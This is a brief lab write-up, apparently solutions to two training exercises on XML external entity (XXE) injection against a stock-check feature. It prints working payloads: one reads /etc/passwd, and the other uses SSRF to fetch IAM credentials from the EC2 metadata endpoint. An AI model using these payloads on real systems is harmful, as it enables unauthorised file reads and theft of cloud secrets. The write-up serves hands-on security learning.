# XXE Injection (XML external entity)

## Lab: Exploiting XXE using external entities to retrieve files

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.

To achieve this lab I used this payload:

```

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<stockCheck><productId>&test;</productId><storeId>1</storeId></stockCheck>

```

## Lab: Exploiting XXE to perform SSRF attacks

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.


```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE root [ <!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>

<stockCheck><productId>&test;</productId><storeId>1</storeId></stockCheck>

```